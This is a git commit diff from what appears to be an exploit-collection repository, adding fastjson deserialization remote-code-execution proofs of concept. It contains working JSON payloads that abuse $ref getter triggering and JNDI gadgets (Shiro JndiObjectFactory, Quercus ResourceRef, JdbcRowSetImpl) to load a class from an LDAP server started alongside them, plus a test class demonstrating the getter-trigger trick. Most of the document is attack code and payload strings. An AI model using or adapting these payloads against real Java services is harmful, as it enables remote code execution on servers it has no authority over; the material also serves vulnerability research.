ea61297cf7b2125ecae0064d2b8061a9e32db1e6
“threedr3am” <929811313@qq.com>
2020-04-07 11:58:05 +0800

    feat:fastjson一种利用$ref几乎任意getter触发的方法

--- fastjson/src/main/java/com/threedr3am/bug/fastjson/rce/ShiroPoc2.java
+++ fastjson/src/main/java/com/threedr3am/bug/fastjson/rce/ShiroPoc2.java
@@ -3,25 +3,16 @@ package com.threedr3am.bug.fastjson.rce;
 import com.alibaba.fastjson.JSON;
 import com.alibaba.fastjson.parser.ParserConfig;
 import com.threedr3am.bug.common.server.LdapServer;
-import org.springframework.security.web.savedrequest.DefaultSavedRequest;
+import java.io.IOException;
 
 /**
  * todo 发现新的Fastjson利用面，通过$ref引用功能，可以任意触发大部分getter方法，理论可以通过此种方式RCE，还能在不开启AutoType的情况下，任意调用大部分当前反序列化对象的getter方法，若存在危险method，就能进行攻击
  *
- * fastjson <= 1.2.68 RCE，需要开启AutoType
- *
- *
- * quercus ResourceRef jndi gadget
- *
- * <dependency>
- *       <groupId>com.caucho</groupId>
- *       <artifactId>quercus</artifactId>
- *       <version>4.0.63</version>
- * </dependency>
+ * fastjson <= 1.2.67
  *
  * @author threedr3am
  */
-public class QuercusPoc {
+public class ShiroPoc2 {
   static {
     //rmi server示例
 //    RmiServer.run();
@@ -30,10 +21,11 @@ public class QuercusPoc {
     LdapServer.run();
   }
 
-  public static void main(String[] args) {
+  public static void main(String[] args) throws IOException {
     ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
 
-    String payload = "{\"@type\":\"com.caucho.config.types.ResourceRef\",\"lookupName\": \"ldap://localhost:43658/Calc\", \"value\": {\"$ref\":\"$.value\"}}";//ldap方式
-    JSON.parse(payload);
+    String json = "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://localhost:43658/Calc\",\"instance\":{\"$ref\":\"$.instance\"}}";
+    JSON.parse(json);
+
   }
 }
--- fastjson/src/main/java/com/threedr3am/bug/fastjson/test/TestPoc.java
+++ fastjson/src/main/java/com/threedr3am/bug/fastjson/test/TestPoc.java
@@ -10,18 +10,70 @@ import com.threedr3am.bug.common.server.LdapServer;
  * @author threedr3am
  */
 public class TestPoc {
-  static {
-    //rmi server示例
+
+    static {
+        //rmi server示例
 //    RmiServer.run();
 
-    //ldap server示例
-    LdapServer.run();
-  }
+        //ldap server示例
+//        LdapServer.run();
+    }
 
-  public static void main(String[] args) {
-    ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+    public static void main(String[] args) {
+//    MockHttpServletRequest mockReq = new MockHttpServletRequest();
+//    DefaultSavedRequest request = new DefaultSavedRequest(mockReq, new PortResolver() {
+//
+//      public int getServerPort(ServletRequest servletRequest) {
+//        return 0;
+//      }
+//    });
+//
+//    String str = JSON.toJSONString(request, SerializerFeature.WriteClassName);
+//    System.out.println(str);
 
-    String payload = "{\"@type\":\"\",\"aaaaa\":\"ldap://localhost:43658/Calc\"}";//ldap方式
-    JSON.parse(payload);
-  }
+//      String str = "{\"rand1\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"rand2\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:43658\",\"autoCommit\":true}";
+//      String str = "{\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:43658\",\"autoCommit\":true}}";
+//    String str = "{\"@type\":\"org.springframework.security.web.savedrequest.DefaultSavedRequest\",\"contextPath\": {\"@type\":\"com.caucho.config.types.ResourceRef\",\"lookupName\": \"ldap://localhost:43658/Calc\"}}";
+        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+        String str = "{\"a\": {\"$ref\":\"$.class\"}}";
+        AAA aaa = JSON.parseObject(str, AAA.class);
+//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+//        String str = "{\"a\": {\"$ref\": \"$.a\"}, \"b\": {\"$ref\": \"$.b\"}, \"c\": {\"$ref\": \"$.c\"}, \"d\": {\"$ref\": \"$.d\"}}";
+//        JSON.parseObject(str, AAA.class);
+//        AAA aaa = new AAA();
+        System.out.println(aaa.getA());
+
+//    JSON.parseObject(str);
+    }
+}
+
+class AAA {
+
+    private String a;
+
+    public String getA() {
+        System.out.println("call the getA method!...");
+        return null;
+    }
+
+    public void setA(String a) {
+        this.a = a;
+    }
+
+    public AAA getB() {
+        System.out.println("call the getB method!...");
+        return null;
+    }
+
+    public Object getC() {
+        System.out.println("call the getC method!...");
+        return null;
+    }
+
+    public String getD() {
+        System.out.println("call the getD method!...");
+        return null;
+    }
+
+
 }
